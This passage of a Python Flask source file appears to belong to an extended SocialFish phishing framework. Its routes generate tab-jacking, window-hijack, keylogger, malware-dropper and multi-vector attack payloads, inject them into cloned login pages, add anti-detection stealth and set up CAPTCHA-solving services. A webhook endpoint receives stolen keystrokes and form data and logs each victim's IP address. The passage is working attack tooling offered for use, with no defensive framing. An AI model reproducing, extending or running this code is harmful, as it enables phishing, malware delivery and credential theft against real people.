@flask_login.login_required
def selenium_record():
    """Start Selenium recording session"""
    data = request.json or request.form
    target_url = data.get('url')
    browser = data.get('browser', 'chrome')
    headless = data.get('headless', 'true').lower() == 'true'
    
    try:
        recorder = SeleniumRecorder(browser=browser, headless=headless)
        recorder.init_driver()
        
        return jsonify({
            'status': 'ok',
            'message': 'Selenium recording started',
            'browser': browser,
            'headless': headless
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Tab Jacking - Hijack victim's browser tab
@app.route("/attack/tabjack", methods=['POST'])
@flask_login.login_required
def tab_jacking():
    """Generate tab jacking payload"""
    data = request.json or request.form
    target_url = data.get('target_url')
    clone_url = data.get('clone_url')
    
    if data.get('type') == 'html':
        payload = TabJacking.generate_tabjack_html(clone_url, target_url)
        return render_template_string(payload)
    else:
        payload = TabJacking.generate_tabjack_payload(target_url)
        return jsonify({
            'status': 'ok',
            'payload': payload,
            'type': 'javascript'
        })

# File Upload Injection - Drop malicious files
@app.route("/attack/file-upload", methods=['POST'])
@flask_login.login_required
def file_upload_injection():
    """Generate file upload/malware dropper payload"""
    data = request.json or request.form
    file_url = data.get('file_url')
    filename = data.get('filename', 'update.exe')
    malware_mode = data.get('malware_mode', 'false').lower() == 'true'
    
    if malware_mode:
        payload = FileUploadInjection.generate_malware_dropper_html(file_url)
        return render_template_string(payload)
    else:
        payload = FileUploadInjection.generate_file_upload_payload(file_url, filename)
        return jsonify({
            'status': 'ok',
            'payload': payload,
            'type': 'javascript'
        })

# Advanced Stealth - Anti-detection techniques
@app.route("/attack/stealth", methods=['GET', 'POST'])
@flask_login.login_required
def advanced_stealth():
    """Get stealth evasion payloads"""
    stealth_type = request.args.get('type', 'perfection')
    
    if stealth_type == 'perfection':
        payload = AdvancedStealth.generate_perfection_js()
    elif stealth_type == 'fingerprint':
        payload = AdvancedStealth.generate_fingerprint_evasion()
    else:
        return jsonify({'status': 'error', 'message': 'Unknown stealth type'}), 400
    
    return jsonify({
        'status': 'ok',
        'stealth_type': stealth_type,
        'payload': payload,
        'size': len(payload),
        'description': 'Inject into cloned page to evade detection'
    })

# CAPTCHA Detection & Solving
@app.route("/attack/captcha/detect", methods=['POST'])
@flask_login.login_required
def captcha_detect():
    """Detect CAPTCHA on page"""
    data = request.json or request.form
    page_html = data.get('html')
    
    if not page_html:
        return jsonify({'status': 'error', 'message': 'HTML required'}), 400
    
    solver = CAPTCHASolver()
    detections = solver.detect_captcha(page_html, [])
    
    return jsonify({
        'status': 'ok',
        'detections': detections,
        'has_captcha': detections['has_captcha'],
        'captcha_type': detections['captcha_type']
    })

# CAPTCHA Solving Setup
@app.route("/attack/captcha/solve", methods=['POST'])
@flask_login.login_required
def captcha_solve():
    """Setup CAPTCHA solving service"""
    data = request.json or request.form
    service = data.get('service', '2captcha')  # 2captcha, anticaptcha, manual
    api_key = data.get('api_key')
    
    try:
        solver = CAPTCHASolver(service=service, api_key=api_key)
        
        # Store solver config in DB (future enhancement)
        return jsonify({
            'status': 'ok',
            'service': service,
            'message': f'CAPTCHA solver configured: {service}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Mock Login Server - Test environment
@app.route("/mock-server/start", methods=['POST'])
@flask_login.login_required
def mock_server_start():
    """Start mock login server for testing"""
    data = request.json or request.form
    port = data.get('port', 5001)
    
    try:
        # Start mock server in background thread
        import threading
        server = MockLoginServer(port=port)
        
        thread = threading.Thread(target=server.run, daemon=True)
        thread.start()
        
        return jsonify({
            'status': 'ok',
            'port': port,
            'message': f'Mock server started on port {port}',
            'endpoints': {
                'login': f'http://localhost:{port}/login',
                'oauth': f'http://localhost:{port}/oauth/authorize',
                'sso': f'http://localhost:{port}/sso/login',
                'api_users': f'http://localhost:{port}/api/users',
                'api_sessions': f'http://localhost:{port}/api/sessions'
            }
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Recording Studio - Choose recorder type
def emit_recording_log(event_type, message, **kwargs):
    """Emit recording events to connected clients via WebSocket"""
    try:
        socketio.emit(event_type, {
            'message': message,
            'type': event_type,
            'timestamp': datetime.datetime.now().isoformat(),
            **kwargs
        }, broadcast=False)
    except Exception as e:
        logger.debug(f"Failed to emit WebSocket event {event_type}: {e}")

@app.route("/studio/recorder", methods=['GET', 'POST'])
@flask_login.login_required
def recording_studio():
    """Recording studio to choose between Playwright and Selenium"""
    if request.method == 'GET':
        return render_template('admin/recording_studio.html')
    
    # POST - start recording
    data = request.json or request.form
    recorder_type = data.get('type', 'playwright')  # playwright or selenium
    target_url = data.get('url')
    browser = data.get('browser', 'chrome')
    headless = data.get('headless', 'true').lower() == 'true'
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'URL required'}), 400
    
    try:
        if recorder_type == 'selenium':
            emit_recording_log('recorder_log', f"Initializing Selenium recorder ({browser})")
            recorder = SeleniumRecorder(browser=browser, headless=headless)
            recorder.init_driver()
            emit_recording_log('recorder_log', "Browser driver initialized")
            success = recorder.record_flow(target_url)
            emit_recording_log('recorder_log', f"Recording completed (found {len(recorder.detected_forms or [])} forms)")
        else:
            # Default Playwright
            emit_recording_log('recorder_log', "Initializing Playwright recorder")
            recorder = PlaywrightRecorder(DATABASE, headless=headless)
            emit_recording_log('recorder_log', "Launching browser instance")
            success = asyncio.run(recorder.record_flow(target_url))
            emit_recording_log('recorder_log', f"Recording completed (found {len(recorder.detected_forms or [])} forms)")
        
        return jsonify({
            'status': 'ok',
            'recorder_type': recorder_type,
            'message': f'Recording started with {recorder_type}'
        })
    except Exception as e:
        emit_recording_log('recording_error', str(e))
        logger.exception(f"Recording error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Attack Payloads Dashboard
@app.route("/admin/attack-payloads", methods=['GET'])
@flask_login.login_required
def attack_payloads():
    """Advanced attack payload generation dashboard"""
    return render_template('admin/attack_payloads.html')

# API: Generate Tab Jacking Payload
@app.route("/api/attacks/tabjack", methods=['POST'])
@flask_login.login_required
def generate_tabjack():
    """Generate tab jacking payload"""
    data = request.json
    redirect_url = data.get('redirect_url')
    delay_ms = data.get('delay_ms', 500)
    
    if not redirect_url:
        return jsonify({'status': 'error', 'message': 'redirect_url required'}), 400
    
    from core.advanced_attacks import AdvancedAttackInjector
    payload = AdvancedAttackInjector.generate_tab_jacker(redirect_url, delay_ms=delay_ms)
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'tab_jacking',
        'payload': payload
    })

# API: Generate Window Hijack Payload
@app.route("/api/attacks/window-hijack", methods=['POST'])
@flask_login.login_required
def generate_window_hijack():
    """Generate aggressive window hijacking payload"""
    data = request.json
    redirect_url = data.get('redirect_url')
    
    if not redirect_url:
        return jsonify({'status': 'error', 'message': 'redirect_url required'}), 400
    
    from core.advanced_attacks import AdvancedAttackInjector
    payload = AdvancedAttackInjector.generate_window_hijack(redirect_url)
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'window_hijack',
        'payload': payload
    })

# API: Generate Keylogger Payload
@app.route("/api/attacks/keylogger", methods=['POST'])
@flask_login.login_required
def generate_keylogger():
    """Generate keylogger injection payload"""
    data = request.json
    webhook_url = data.get('webhook_url', '/api/webhook')
    
    from core.advanced_attacks import AdvancedAttackInjector
    payload = AdvancedAttackInjector.generate_keylogger(webhook_url)
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'keylogger',
        'payload': payload
    })

# API: Generate File Download Injection
@app.route("/api/attacks/file-download", methods=['POST'])
@flask_login.login_required
def generate_file_download():
    """Generate file download injection payload"""
    data = request.json
    file_url = data.get('file_url')
    filename = data.get('filename', 'document.pdf')
    
    if not file_url:
        return jsonify({'status': 'error', 'message': 'file_url required'}), 400
    
    from core.advanced_attacks import AdvancedAttackInjector
    payload = AdvancedAttackInjector.generate_file_download_injection(file_url, filename)
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'file_download',
        'payload': payload
    })

# API: Generate Multi-Vector Attack
@app.route("/api/attacks/multi-vector", methods=['POST'])
@flask_login.login_required
def generate_multi_vector():
    """Generate combined multi-vector attack"""
    data = request.json
    capture_url = data.get('capture_url')
    webhook_url = data.get('webhook_url', '/api/webhook')
    file_download_url = data.get('file_download_url')
    
    if not capture_url:
        return jsonify({'status': 'error', 'message': 'capture_url required'}), 400
    
    from core.advanced_attacks import AttackTemplateBuilder
    attacks = AttackTemplateBuilder.build_multi_vector_attack(
        capture_url,
        webhook_url,
        file_download_url
    )
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'multi_vector',
        'individual_payloads': attacks['individual_payloads'],
        'combined_script': attacks['combined_script'],
        'injection_methods': attacks['injection_methods']
    })

# API: Inject Payload into Template
@app.route("/api/attacks/inject-template", methods=['POST'])
@flask_login.login_required
def inject_payload_to_template():
    """Inject attack payload into clone template"""
    data = request.json
    template_id = data.get('template_id')
    payload = data.get('payload')
    injection_method = data.get('injection_method', 'html_script_injection')
    
    if not template_id or not payload:
        return jsonify({'status': 'error', 'message': 'template_id and payload required'}), 400
    
    try:
        cur = g.db
        
        # Get template
        template = cur.execute(
            "SELECT cloned_html FROM templates WHERE id = ?",
            (template_id,)
        ).fetchone()
        
        if not template:
            return jsonify({'status': 'error', 'message': 'Template not found'}), 404
        
        from core.advanced_attacks import InjectionMethods
        
        cloned_html = template[0]
        
        if injection_method == 'dom_ready':
            modified_html = InjectionMethods.dom_ready_injection(cloned_html, payload)
        elif injection_method == 'inline_event':
            modified_html = InjectionMethods.inline_event_injection(cloned_html, payload)
        else:  # html_script_injection
            modified_html = InjectionMethods.html_script_injection(cloned_html, payload)
        
        # Update template with injected code
        cur.execute(
            "UPDATE templates SET cloned_html = ? WHERE id = ?",
            (modified_html, template_id)
        )
        g.db.commit()
        
        return jsonify({
            'status': 'ok',
            'message': f'Payload injected using {injection_method}',
            'modified': True
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API: Webhook Handler - Receive attack data
@app.route("/api/webhook", methods=['POST'])
def webhook_handler():
    """Receive attack-generated data (keystrokes, form data, etc.)"""
    data = request.json or request.form.to_dict()
    
    # This would be called by injected JavaScript payloads
    webhook_type = data.get('type')
    victim_ip = request.remote_addr
    
    # Log to console
    print(f"[+] Webhook data received from {victim_ip}: {webhook_type}")
    
    # Broadcast to admin panel via WebSocket
    # Avoid passing `broadcast` keyword directly to ensure compatibility
    payload = {
        'type': webhook_type,
        'victim_ip': victim_ip,
        'data': data,
        'timestamp': date.today().isoformat()
    }
    try:
        socketio.emit('webhook_data', payload)
    except TypeError:
        # Fallback for older/newer server implementations
        socketio.server.emit('webhook_data', payload)
    
    return jsonify({'status': 'ok'})

#================================================================================================================================
def main():
        if version_info<(3,0,0):
            print('[!] Please use Python 3. $ python3 SocialFish.py')
            exit(0)
        head()
        cleanFake()
        # Inicia o banco e executa migracao
        initDB(DATABASE)
        migrate_db(DATABASE)
        # Inicia o servidor com SocketIO
        socketio.run(app, host="0.0.0.0", port=5000, debug=False)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
